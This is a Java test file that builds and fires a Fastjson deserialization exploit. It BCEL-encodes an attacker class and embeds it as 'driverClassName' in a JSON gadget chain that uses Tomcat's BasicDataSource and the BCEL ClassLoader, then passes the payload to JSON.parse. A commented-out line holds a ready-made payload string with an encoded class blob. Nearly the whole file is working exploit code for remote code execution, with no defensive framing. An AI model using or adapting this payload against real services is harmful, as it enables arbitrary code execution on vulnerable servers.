package BCEL;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.IOException;

public class Test {
    public static void main(String[] args) throws IOException {
            JavaClass cls = Repository.lookupClass(Eivl.class);
            String code = Utility.encode(cls.getBytes(), true);//转换为字节码并编码为bcel字节码

//            String poc = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"},\"x\":{\"name\": {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"y\": \n" +
//                    "{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\": {\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": {\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\n" +
//                    "\"driverClassName\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$3bO$c30$Q$fe$9c$86$a4$84$f4My$_L$a4$j$92$85$ad$88$81$wHH$VE$U$c1$9c$Y$xr$95$sU$e2$a0$fc$z$W$40$M$fc$A$7e$U$e2$d2$a1T$c2$96$ef$fc$3dN$e7$f3$f7$cf$e7$X$80s$9cX0$d0$b2$d0F$a7$8en$95$7b$svM$f4$Z$8c$L$99Hu$c9Ps$G$8f$M$fa8$7d$W$M$ad$89L$c4m$b1$IE$f6$Q$8411$96_r$b1T2Mr$T$7b$84gi$91qq$z$x$b1$ee$97Kw$k$bc$E6L$d4M$ec$db8$c0$n$f1$3c$88$b9$xJa$e3$I$c7$84$af$c6$fe$c4$p3C$bb$b2$7bq$90D$de4$9c$L$ae$Yz$xJ$a6$de$cdt$dd$8c$a1$f3g$bc$_$S$r$X$d5c$o$a1$d6$a0$ef$M$s$ff$3c$p$g$85$far$863gC$9d$a9L$s$d1h$b3$e0$$K$b9$c8$f3$RN$b1E$bfT$zF$9b$e6$80$86mB$$eF$b99$7c$H$fb$80$d6$ad$bdA$7fz$5d$f9$ac$8aG$8d$a2$B$9dj$gT$b5CH$t$cd$a6$d3$a0$bb$86$e6$_vr3$u$89$B$A$A\",\"$ref\":\"$.x.y.c.connection\"}}}}";


        String s = "{\n" +
                "    \"name\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"y\": {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"$$BCEL$$" + code + "\",\n" +
                "\n" +
                "                     \"$ref\": \"$.x.y.c.connection\"\n" +
                "\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}";




        System.out.println(s);
            JSON.parse(s);

    }
}
